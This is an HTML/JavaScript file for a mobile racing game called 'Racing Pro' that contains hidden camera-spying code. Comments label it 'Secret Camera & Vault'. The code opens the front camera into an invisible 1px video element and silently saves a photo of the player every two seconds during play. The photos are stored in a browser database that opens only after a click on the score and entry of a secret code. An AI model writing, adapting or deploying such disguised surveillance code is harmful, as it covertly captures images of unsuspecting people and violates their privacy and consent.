<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Racing Pro</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; cursor: pointer; z-index: 10; }
        
        #gameArea { position: relative; width: 340px; height: 60vh; background: #222; border: 4px solid #444; overflow: hidden; }
        
        /* Screens */
        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; }
        .hidden { display: none !important; }

        /* Game visuals */
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; bottom: 20px; left: 147px; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; top: -100px; }

        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 75px; height: 75px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; color: white; font-size: 24px; }
        
        /* Secret Camera & Vault */
        #vContainer { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        video { width: 100%; height: 100%; transform: scaleX(-1); }
        #vault { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; overflow-y: auto; padding: 20px; }
        .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .photo-card { border: 1px solid #444; position: relative; }
        .photo-card img { width: 100%; display: block; }

        button.start-btn { padding: 15px 40px; font-size: 20px; background: #f1c40f; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div id="score" onclick="askSecretCode()">Score: 0</div>

    <div id="gameArea">
        <div id="startScreen" class="screen">
            <h1>RACING PRO</h1>
            <button class="start-btn" onclick="startGame()">START GAME</button>
        </div>

        <div id="gameOverScreen" class="screen hidden">
            <h1 style="color: #e74c3c;">GAME OVER</h1>
            <p id="finalScore">Score: 0</p>
            <button class="start-btn" onclick="startGame()">RESTART</button>
        </div>

        <div id="player" class="car player"></div>
        <div id="enemy" class="car enemy"></div>
    </div>

    <div class="controls">
        <button class="btn" onpointerdown="move(-30)">L</button>
        <button class="btn" onpointerdown="move(30)">R</button>
    </div>

    <div id="vContainer"><video id="video" autoplay playsinline muted></video></div>
    <canvas id="canvas" style="display:none;" width="320" height="240"></canvas>

    <div id="vault">
        <button onclick="closeVault()" style="width:100%; padding:15px; background:#f1c40f; border:none; margin-bottom:10px;">BACK TO GAME</button>
        <div class="photo-grid" id="photoGrid"></div>
    </div>

    <script>
        const player = document.getElementById('player');
        const enemy = document.getElementById('enemy');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let db, gameActive = false, score = 0, enemySpeed = 3;

        // 1. DATABASE SETUP
        const request = indexedDB.open("VamsiJacksVault", 1);
        request.onupgradeneeded = (e) => { e.target.result.createObjectStore("captures", { keyPath: "id", autoIncrement: true }); };
        request.onsuccess = (e) => { db = e.target.result; initCamera(); };

        // 2. CAMERA & SECRET CAPTURE
        function initCamera() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; setInterval(captureImage, 2000); });
        }

        function captureImage() {
            if (!db || !gameActive) return;
            const ctx = canvas.getContext('2d');
            ctx.save(); ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
            const data = canvas.toDataURL('image/jpeg', 0.4);
            db.transaction("captures", "readwrite").objectStore("captures").add({ img: data });
        }

        // 3. GAME CONTROL
        function startGame() {
            score = 0;
            enemySpeed = 3; // Reset speed to be slow
            gameActive = true;
            document.getElementById('score').innerText = "Score: 0";
            document.getElementById('startScreen').classList.add('hidden');
            document.getElementById('gameOverScreen').classList.add('hidden');
            player.style.left = "147px";
            enemy.style.top = "-100px";
            requestAnimationFrame(updateGame);
        }

        function move(dir) {
            if (!gameActive) return;
            let left = player.offsetLeft + dir;
            if (left >= 0 && left <= 295) player.style.left = left + "px";
        }

        function updateGame() {
            if (!gameActive) return;

            let eTop = enemy.offsetTop + enemySpeed;
            if (eTop > 400) {
                eTop = -100;
                enemy.style.left = Math.floor(Math.random() * 280) + "px";
                score++;
                document.getElementById('score').innerText = "Score: " + score;
                if (score % 5 === 0) enemySpeed += 0.5; // Slightly speed up every 5 points
            }
            enemy.style.top = eTop + "px";

            // Collision Detection
            if (isColliding(player, enemy)) {
                endGame();
                return;
            }
            requestAnimationFrame(updateGame);
        }

        function isColliding(a, b) {
            let aR = a.getBoundingClientRect();
            let bR = b.getBoundingClientRect();
            return !(aR.top > bR.bottom || aR.bottom < bR.top || aR.right < bR.left || aR.left > bR.right);
        }

        function endGame() {
            gameActive = false;
            document.getElementById('gameOverScreen').classList.remove('hidden');
            document.getElementById('finalScore').innerText = "Score: " + score;
        }

        // 4. SECRET ACCESS
        function askSecretCode() {
            if (prompt("Enter Secret Code:") === "vamsi jacks") {
                document.getElementById('vault').style.display = 'block';
                loadGallery();
            }
        }

        function loadGallery() {
            const grid = document.getElementById('photoGrid');
            grid.innerHTML = "";
            db.transaction("captures", "readonly").objectStore("captures").openCursor(null, "prev").onsuccess = (e) => {
                const cursor = e.target.result;
                if (cursor) {
                    const div = document.createElement('div');
                    div.className = "photo-card";
                    div.innerHTML = `<img src="${cursor.value.img}">`;
                    grid.appendChild(div);
                    cursor.continue();
                }
            };
        }

        function closeVault() { document.getElementById('vault').style.display = 'none'; }
    </script>
</body>
</html>
